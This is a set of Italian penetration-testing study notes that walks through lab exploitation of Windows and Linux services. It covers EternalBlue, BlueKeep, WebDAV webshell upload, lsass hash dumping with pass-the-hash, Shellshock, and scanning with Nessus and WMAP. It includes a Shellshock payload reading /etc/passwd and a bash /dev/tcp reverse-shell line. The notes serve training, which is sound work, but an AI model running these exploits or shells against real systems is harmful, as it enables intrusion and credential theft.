# Vulnerability Assessment

Tipi di vulnerabilità Windows:

* Information disclosure
* Buffer overflow
* Remote code execution
* Privilege escalation
* Denial of Service (DoS)

<figure><img src="../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

## Vulnerability Scanning con Metasploit Framework (MSF)

### Scan degli IP nella rete

```
sudo nmap -sn 10.10.10.1/24
```

### Setup workspace MSF e scan servizi IP target

```
service postgresql start
msfconsole
setg RHOSTS 10.10.10.4
workspace -a MS3 //metasploitable 3
db_nmap -sS -sV -O 10.10.10.4 //consente di fare uno scan dentro msf e imposta automaticamente i dati nel db msf.

hosts
services
```

### Cercare moduli exploit dentro MSF

```
search type:exploit name:Microsoft IIS
```

### searchsploit: Cercare exploit (tra cui moduli MSF) da bash linux

```
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit" //è case sensitive
```

### analyze: Comando per trovare exploit per i servizi salvati nel DB MSF

Analizza il contenuto del database metasploit (host e services) e ci mostra una serie di exploit per le vulnerabilità presenti per host e servizi.

```
analyze
vulns
```

Il comando vulns invece ci mostra  le vulnerabilià con realtiva CVE.

### Eternal Blue: esempio con target vulnerabile

#### Test se target vulnerabile a Eternal Blue tramite modulo MSF auxiliary

```
use auxiliary/scanner/smb/smb_ms17_010
```

#### Uso del modulo MSF per exploit vulnerabilità Eternal Blue

```
use exploit/windows/smb/ms17_010_eternalblue
// il payload di default è per windows x64 quindi ci va bene
show options
run
```

Dovremmo settare LHOST e LPORT che in realtà LHOST è già corretto, mentre per LPORT ci basta aprire una connessione in ascolto su quella porta, che però ci aprirà in realtà in automatico il modulo.

### Plugin MSF db\_autopwn

Identifica i moduli exploit per le porte aperte sul sistema, e fornisce una lista di tutti gli exploit disponibili per i servizi con porte aperte.

#### Installazione DB autopawn

```
cd Downloads/
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
// Torniamo in metasploit
load db_autopawn
db_autopawn
```

#### Utilizzo di DB autopawn in metasploit (MSF)

```
db_autopwn -p -t -PI 445 //per SMB port come target
```

## WebDAV vulnerabilities

<figure><img src="../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

### Nmap scan dei servizi

```
nmap -sV -sC 10.2.17.124
nmap -sV -p 80 --script=http-enum 10.2.17.124
```

E identifichiamo se alla porta HTTP (80 e 443) troviamo Microsoft IIS con webdav.

La pagina che ospita WebDAV richiede autenticazione tramite web authentication form.

### hydra: Brute force web authentication form

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
// http-get è il tipo di richiesta, mentre /webdav/ è la pagina dove si trova l'authentication formdavtest: Identificare estensioni file eseguibili e operazioni supportate da WebDav
```

### davtest: Identificare estensioni file supportate ed eseguibili da WebDav

```
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```

Quello che fa è dirci quali file possiamo caricare ed eseguire sul server.&#x20;

Ad esempio possiamo eseguire file asp, e significa che possiamo creare dei payload in asp da inserire ed eseguire, come ad esempio una remote shell.

### cadaver: Caricare file e webshell su WebDav

Cadaver ci consente di fare upload, download di file nella directory WebDav.

```
cadaver http://10.2.17.124/webdav
// chiede poi username e password, e ci connette alla directory
put /usr/share/webshells/asp/webshell.asp
```

Ricarichiamo la pagina web di webdav e vediamo infatti la webshell.asp, la clicchiamo e utilizziamo.

### Utile: Directory con tutte le webshell

```
ls -al /usr/share/webshells/
```

## Vulnerability Analysis: EternalBlue (MS17-010) - SMB

<figure><img src="../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>

### Scan Nmap per vedere OS e porta SMB

```
sudo nmap -sV -p 445 -O 10.10.10.12
```

### Scan Nmap per verificare se SMB è vulnerabile a EternalBlue

```
sudo nmap -sV -p 445  --script=smb-vuln-ms17-010 10.10.10.12
```

### Exploit manuale con AutoBlue-MS17-010

Seguire le indicazioni sul github ed eventualmente gli appunti dettagliati.

{% embed url="https://github.com/3ndG4me/AutoBlue-MS17-010" %}

### Exploit automatico con Metasploit Framework

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12 //target IP
exploit
```

#### Per verificare se è vulnerabile

è possibile utilizzare questo modulo auxiliary:

```
use auxiliary/scanner/smb/smb_ms17_010
```

## Vulnerability Analysis: BlueKeep (CVE-2019-0708) - RDP

<figure><img src="../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>

Deve essere abilitato RDP e disabilitata la Network Level authentication. E quindi per mitigare si può abilitare la Network Level Authentication.

**Modificare ed eseguire codice al kernel level è probabile risulti in crash del sistema.**

### Test porta RDP 3389 aperta

```
sudo nmap -p 3389 10.10.10.7
```

### Esecuzione exploit con modulo di Metasploit Framework

```
msfconsole
search BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP target>
run
```

#### Esecuzione exploit su target vulnerabile

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOSTS 10.10.10.7
show targets
set target 2
```

è uno staged payload, e funziona solo su Windows a 64 bit.

Nel nostro caso il target è un Windows 7 SP1 build 7601 x64 su Virtualbox. Quindi impostiamo il numero 2.

Aspettiamo di capire se sta funzionando, ha settato la dimensione del CHUNK grooming strategy (groom size) a 250MB, ma questo dipende dalla RAM allocata per la macchina target, quindi potrebbe essere da cambiare. Se questo valore è troppo alto può causare il crash della macchina target.

**In casi reali in cui abbiamo come target un sistema di una azienda bisogna assolutamente fare attenzione ad avviare degli exploit che sfruttano il kernel. Perché possono causare crash e perdite di memoria.**

## Pass-the-Hash attack

### Punto di partenza

* Hai già una sessione su una macchina Windows (meterpreter) o solo l’hash.
* Rete raggiungibile via SMB verso il target.

### Exploit di BadBlue (es. per ottenere una sessione SMB)

```
service postgresql start && msfconsole   //avvia Metasploit Framework
search badblue
use exploit/windows/http/badblue_passthru
set RHOSTS <IP target>
exploit
// otteniamo una sessione attiva di meterpreter
```

### Ottenere l'hash (se ho già la sessione attiva)

In meterpreter trova il process id (PID) di lsass che è un processo a livello di sistema e usalo per migrare ai suoi privilegi:

```
pgrep lsass        # ottieni pid (es. 780)
migrate 780
getuid             # verifica NT AUTHORITY\SYSTEM
```

#### Estrarre l'hash con Kiwi o Mimikatz

```
load kiwi
lsa_dump_sam   # o lsa_dump_secrets/hashdump
hashdump
```

Salva le righe `username:LM:NTLM:RID` in un file .txt (es. `hashes.txt`).

> Nota: se l'LM è non usato apparirà il placeholder `aad3b435b51404eeaad3b435b51404ee`.

### Scelta 1: Eseguire il pass-the-hash con psexec in MSF

Anzitutto mettere la sessione precedente in background con CTRL+Z e poi usiamo il modulo psexec:

```
search psexec
use exploit/windows/smb/psexec
show options
set LPORT 4422
set RHOSTS <target_IP>
set SMBUser Administrator
set SMBPass <LM_Hash>:<NTLM_Hash>
set target <tipo_target>   # es. Native\ upload o Command
exploit
```

Se fallisce, prova a cambiare `target` (es. `Command`) o il metodo di upload.

Se va a buon fine otterrai una sessione come `NT AUTHORITY\SYSTEM` sul target.

### Scelta 2: Eseguire il pass-the-hash con CrackMapExec

```
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash>
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "whoami"
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "ipconfig"
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "net user administrator password123"
```

* CME accetta solo NTLM con `-H` (non serve LM).
* Utile per eseguire comandi rapidi senza caricare meterpreter.

### Sicurezza e contromisure (breve)

* Abilitare LSA protection / Credential Guard.
* Disabilitare memorizzazione LM e usare policy forti.
* Monitorare tentativi SMB e movimenti laterali.
* Utilizzare MFA e credenziali gestite (LAPS).

***

## Frequently Exploited Linux Services

<figure><img src="../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

## Vulnerability Analysis: Shellshock (CVE-2014-6271) - Apache e Bash

Vulnerabilità Linux:  **() { :; }; echo; echo; /bin/bash -c '\<comando da eseguire>'**

### Identificare se un server è vulnerabile a Shellshock

```
nmap -sV 192.24.241.3
nmap -sV 192.24.241.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" //dobbiamo per forza inserre come argomento il percorso per lo script cgi
```

Es. il countdown presente nella home di un sito è fatto con CGI, ed è possibile verificarlo guardando il sorgente della pagina.

### Exploit manuale per Shellshock

1. Attiviamo il redirect del traffico da mozilla firefox al proxy di Burp Suite con l'add-on presente qui sopra.
2. Apriamo Burp Suite
3. Aggiorniamo la pagina con lo script cgi in modo che venga intercettata la richiesta all'interno di Burp Suite, la inviamo a Repeater e la modifichiamo.
4. Sostituiamo User-Agent con i nostri caratteri speciali **() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'**
5. Effettivamente possiamo vedere che nella risposta troviamo il contenuto del file passwd, e quindi possiamo identificare i vari utenti come ad esempio nobody.

#### Per ottenere una reverse shell

1. Apriamo una porta con il listener netcat: nc -nvlp 1234
2. Apriamo poi Burp Suite e cambiamo il comando specificato nell'user agent con: **'bash -i>&/dev/tcp/KALI LINUX IP/PORT 0>&1'**
3. Provare la reverse shell nel listener con: **uname -a**

### Exploit automatico con MSF

```
msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS 192.24.241.3
set TARGETURI /gettime.cgi
exploit
```

Per testare se è vulnerabile a shellshock usare: **auxiliary/scanner/http/apache\_mod\_cgibash\_env**

## Nessus: Vulnerability Scanning

### Installare Nessus Essentials

Visitare la pagina tenable.com/products/nessus e scaricare Nessus Essentials per Debian/Kali Linux.

```
cd Downloads
chmod + Nessus-10.0.0-debian6_amd64.deb
sudo dpkg -i Nessus-10.0.0-debian6_amd64.deb
```

### Avviare Nessus e fare uno scan

```
// Per avviare:
sudo systemctl start nessusd.service
// visita la pagina https://kali:8834/
```

* Selezionare Basic Network Scan che corrisponde ad una full system scan.
* Una volta selezionati i parametri e configurati gli IP avviare lo scan.
* Terminato lo scan visualizzare i risultati nel tab "Vulnerabilities".
* Se non si cambia il filtro di default vengono visualizzati i risultati partendo dall'applicazione che ha più vulnerabilità.
* All'interno della pagina di dettagli delle vulnerabilità le informazioni importanti mostrate sono CVE, CVSS, exploits available ed exploitable with dalla colonna di destra.

Filtri utili:

* impostando il filtro Metasploit Exploit Framework a true troviamo le vulnerabilità che sono exploitabili con Metasploit.
* Per Severity = High, Critical ...

### Esportare i risultati dello Scan

Nella pagina dei risultati dello scan, in alto a destra: Esportare i risultati come "Export > Nessus" e importarli nel DB di Metasploit Framework

### Avviamo MSF Console per importarci i risultati di Nessus

```
msfconsole
workspace -a MS3_Nessus
db_import /home/kali/Downloads/MS3_fkthix.nessus
hosts
services
vulns
```

Per limitare i risultati delle vulnerabilità ad un solo servizio, es. SMB, devo specificare la porta:

```
vulns -p 445
```

Per trovare i moduli exploit per una particolare vulnerabilità si può inserire il CVE (o anche solo l'anno) o il Microsoft Vulnerability Identifier nella ricerca, e poi specificare il servizio (es. SMB):

```
search cve:2017 name:smb
search cve:2012 name:rdp
search MS12-020
search cve:2015 name:MenageEngine
```

## WMAP: Web App Vulnerability Scanning

```
service postgresql start
msfconsole
workspace -a Web_Scanning
setg RHOSTS 192.157.89.3
load wmap
wmap_sites -a 192.157.89.3
wmap_targets -t http://192.157.89.3
wmap_sites -l
wmap_targets -l
```

### Eseguire moduli Metasploit compatibili con WMAP

```
wmap_run -h
wmap_run -t //identifica tutti i moduli auxiliary compatibili con il target
wmap_run -e //esegue i moduli compatibili trovati prima
```

wmap\_run -t va a cercare tutti i moduli auxiliary che possono essere utili per il nostro target.&#x20;

wmap\_run -e va a usare tutti i moduli che possono essere utili per il nostro target e webserver, non tutti in generale.

Osservare bene il contenuto della wmap\_run -e per identificare l'esito della http enumeration. \
In particolare fare attenzione a:

* le chiamate HTTP supportate (la PUT ci consente di caricare file exploit per reverse shell
* Il file robots.txt che identifica le cartelle nascoste (es. data e secure)
* vengono identificate le varie cartelle e file trovati sul server
* Vulnerabilità a SQL injection o path traversal

#### Listare tutte le vulnerabilità, misconfigurazioni e informazioni trovate sul target

```
wmap_vulns -h
wmap_vulns -l
```

### Identificare path con HTTP PUT abilitata

Se riuscissimo a trovare una cartella dove è possibile inserire un file tramite HTTP PUT sarebbe ideale per caricare exploit e ottenere una reverse shell.

#### Verificare metodi supportati sulla root del sito

```
use auxiliary/scanner/http/options
show_options
run
```

#### Verificare supporto PUT per singole cartelle (es. quelle in robots.txt)

```
use auxiliary/scanner/http/http_put
show options
set PATH /data/
run
```

Prossimi passi di un attaccante/pentester: caricare una reverse shell payload in PHP sul webserver e visitare il sito da browser per fare in modo che venga eseguito il file e ci troveremmo una connessione reverse shell attiva sul nostro netcat listener.

